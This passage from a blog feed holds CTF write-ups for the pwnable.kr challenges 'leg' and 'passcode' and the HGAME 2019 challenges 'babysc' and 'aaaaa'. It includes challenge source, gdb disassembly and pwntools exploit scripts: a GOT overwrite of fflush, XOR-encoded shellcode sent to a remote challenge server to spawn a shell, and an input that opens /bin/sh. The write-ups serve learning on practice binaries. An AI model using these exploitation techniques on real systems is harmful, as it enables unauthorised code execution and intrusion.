class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here's your flag</span></span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>就不做了8, 就当记录一下题. 继续看下一题</p><h1 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h1><p>Daddy told me I should study arm.<br>But I prefer to study my leg!</p><p>Download : <a href="http://pwnable.kr/bin/leg.c" target="_blank" rel="noopener">http://pwnable.kr/bin/leg.c</a><br>Download : <a href="http://pwnable.kr/bin/leg.asm" target="_blank" rel="noopener">http://pwnable.kr/bin/leg.asm</a></p><p>ssh <a href="mailto:leg@pwnable.kr" target="_blank" rel="noopener">leg@pwnable.kr</a> -p2222 (pw:guest)</p><h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// leg.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">"mov r3, pc\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"push&#123;r6&#125;\n"</span></span><br><span class="line"><span class="string">"addr6, pc, $1\n"</span></span><br><span class="line"><span class="string">"bxr6\n"</span></span><br><span class="line"><span class="string">".code   16\n"</span></span><br><span class="line"><span class="string">"movr3, pc\n"</span></span><br><span class="line"><span class="string">"addr3, $0x4\n"</span></span><br><span class="line"><span class="string">"push&#123;r3&#125;\n"</span></span><br><span class="line"><span class="string">"pop&#123;pc&#125;\n"</span></span><br><span class="line"><span class="string">".code32\n"</span></span><br><span class="line"><span class="string">"pop&#123;r6&#125;\n"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">"mov r3, lr\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Daddy has very strong arm! : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"><span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"flag"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">write(<span class="number">0</span>, buf, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I have strong leg :P\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:push&#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:addr11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:subsp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:movr3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:strr3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:ldrr0, [pc, #104]; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:bl0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:subr3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:ldrr0, [pc, #96]; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:movr1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:bl0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:bl0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:movr4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:bl0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:movr3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:addr4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:bl0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:movr3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:addr2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:ldrr3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:cmpr2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:bne0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:ldrr0, [pc, #44]; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:bl0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:ldrr0, [pc, #40]; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:bl0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:b0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:ldrr0, [pc, #32]; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:bl0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:movr3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:movr0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:subsp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:pop&#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:andeqr10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:andeqr10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:andeqr10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:movr3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:push&#123;r6&#125;; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:addr6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:bxr6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:movr3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:addsr3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:push&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:pop&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:pop&#123;r6&#125;; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:movr0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;random&quot;&gt;&lt;a href=&quot;#random&quot; class=&quot;headerlink&quot; title=&quot;random&quot;&gt;&lt;/a&gt;random&lt;/h1&gt;&lt;p&gt;Daddy, teach me how to use random value in programming
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
      <category term="PWN" scheme="http://lxzmads.github.io/tags/PWN/"/>
    
      <category term="PWNABLE.KR" scheme="http://lxzmads.github.io/tags/PWNABLE-KR/"/>
    
  </entry>
  
  <entry>
    <title>从零开刷PWNABLE.KR系列-passcode</title>
    <link href="http://lxzmads.github.io/2019/02/27/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%88%B7PWNABLE.KR%E7%B3%BB%E5%88%97-passcode/"/>
    <id>http://lxzmads.github.io/2019/02/27/从零开刷PWNABLE.KR系列-passcode/</id>
    <published>2019-02-26T16:00:00.000Z</published>
    <updated>2019-02-27T12:08:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><p>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?</p><p>ssh <a href="mailto:passcode@pwnable.kr" target="_blank" rel="noopener">passcode@pwnable.kr</a> -p2222 (pw:guest)</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Firstly do some regular checks. The result show that it’s 32-bit ELF and the <code>checksec</code> command says</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE</span><br></pre></td></tr></table></figure><p>Also, wet are provided with the source code of the binary. The code is a bit long and I won’t paste it all here. To be honest, I didn’t find the way to exploit it though I quickly found the wrong use of <code>scanf</code> in funtion <code>login</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I think the comment of <code>login</code> function saying <code>ha! mommy told me that 32bit is vulnerable to bruteforcing :)</code> misleading me to some way endless. Because I found there is no need to bruteforcing any 32-bit shit and get flag. Of course after catching a glimpse of the writeup on the google:) (Owning to my finite knowledge</p><p>So the vulnerability of this program lies on the stack. When the <code>welcome</code> funtion returns, the variables of on the stack won’s be cleared. So we are able to control the value of variables in the new function <code>login</code>(i.e <code>passcode1</code>, <code>passcode2</code>). Then due to the wrong use of <code>scanf</code>, we can write the value of an address we specified. The common practice is writing an <code>GOT</code> entry to jump to where we want. In this Challenge, there are code for reading <code>flag</code> so we just write the address of that block of code.</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'/home/passcode/passcode'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'/home/passcode/passcode'</span>)</span><br><span class="line"></span><br><span class="line">fflush_got = elf.got[<span class="string">'fflush'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil('name : ')</span></span><br><span class="line">p.sendline(<span class="string">'A'</span>*<span class="number">96</span>+p32(fflush_got))</span><br><span class="line"><span class="comment">#p.recvuntil(' passcode1 : ')</span></span><br><span class="line">p.sendline(<span class="string">'134514147'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><p>BTW, this is the first challenge we need to write exp on the challenge server with rigid access control. We can’t write code in the challenge directory but the <code>/tmp/&lt;whatever&gt;</code>. And link the flag to the temp directory for our exploit script reading by <code>ln -s /home/passcode .</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;passcode&quot;&gt;&lt;a href=&quot;#passcode&quot; class=&quot;headerlink&quot; title=&quot;passcode&quot;&gt;&lt;/a&gt;passcode&lt;/h1&gt;&lt;p&gt;Mommy told me to make a passcode based login s
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
      <category term="PWN" scheme="http://lxzmads.github.io/tags/PWN/"/>
    
      <category term="PWNABLE.KR" scheme="http://lxzmads.github.io/tags/PWNABLE-KR/"/>
    
  </entry>
  
  <entry>
    <title>H-GAME WEEK-1 PWN PART 1</title>
    <link href="http://lxzmads.github.io/2019/02/26/HGAME2019%20WEEK-1%20PWN%20PART%201/"/>
    <id>http://lxzmads.github.io/2019/02/26/HGAME2019 WEEK-1 PWN PART 1/</id>
    <published>2019-02-25T16:00:00.000Z</published>
    <updated>2019-02-26T10:49:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天在群里看到大佬们在讨论hgame的题目, 翻了翻发现题目难度还挺适合我这种萌新的, 于是刷了刷, 这里记录一下. 题目仓库在<a href="https://github.com/ly-test-fuzz/pwn_repo/tree/master/H-game" target="_blank" rel="noopener">这</a>.</p><h1 id="babysc"><a href="#babysc" class="headerlink" title="babysc"></a>babysc</h1><p>错过比赛, 没有题目描述, QAQ</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>按照惯例, file&amp;checksec一下, 发现是64位程序, 并且什么保护也没开(果然是萌新题嘿嘿). 拖进IDA(话说MAC下IDA7.0的中文输入法崩溃问题终于解决了, 感谢<a href="https://github.com/fjh658" target="_blank" rel="noopener">冯子</a>前辈). <del>发现没法F5</del>(发现可以将那句NOP掉), 好在逻辑简单, 直接看汇编也问题不大,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">92</span>]; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  signal(<span class="number">14</span>, handle);</span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">79</span>; ++i )</span><br><span class="line">    buf[i] ^= i + <span class="number">1</span>;</span><br><span class="line">  JUMPOUT(unk_400673); <span class="comment">// NOP of `call rds`;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是将我们的输入与数组下标+1进行异或, 然后直接call过去. 于是我们就反过来将<code>shellcode</code>做相同操作传过去就好啦~</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode  = asm(shellcraft.amd64.linux.sh(),arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">shellcode_xor = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">    shellcode_xor += chr(ord(shellcode[i]) ^ (i+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./babysc'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"118.24.3.214"</span> , <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode_xor)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;Baby_Baby_S0_E4ay!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="aaaaa"><a href="#aaaaa" class="headerlink" title="aaaaa"></a>aaaaa</h1><p>错过比赛, 没有题目描述, QAQ</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>这是道真萌新题, 本着完整性原则放一下哈哈.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">14</span>, handle);</span><br><span class="line">  alarm(<span class="number">10u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to PWN'world!let us aaaaaaaaaa!!!"</span>);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v5++;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">99</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getchar() != <span class="string">'a'</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就不解释了, 直接上EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./aaaaaaaaaa'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'118.24.3.214'</span>,<span class="number">9999</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># hgame&#123;Aa4_4aA_4a4aAAA&#125;</span></span><br></pre></td></tr></table></figure><p>WEEK-1 还有两道比较复杂的, 放到下半部分做～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天在群里看到大佬们在讨论hgame的题目, 翻了翻发现题目难度还挺适合我这种萌新的, 于是刷了刷, 这里记录一下. 题目仓库在&lt;a href=&quot;https://github.com/ly-test-fuzz/pwn_repo/tree/master/H-game&quot; tar
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
      <category term="PWN" scheme="http://lxzmads.github.io/tags/PWN/"/>
    
      <category term="HGAME2019" scheme="http://lxzmads.github.io/tags/HGAME2019/"/>
    
  </entry>
  
  <entry>
    <title>月赛乙队题目记录-2019-02-24</title>
    <link href="http://lxzmads.github.io/2019/02/25/%E6%9C%88%E8%B5%9B%E4%B9%99%E9%98%9F%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95-2019-02-24/"/>
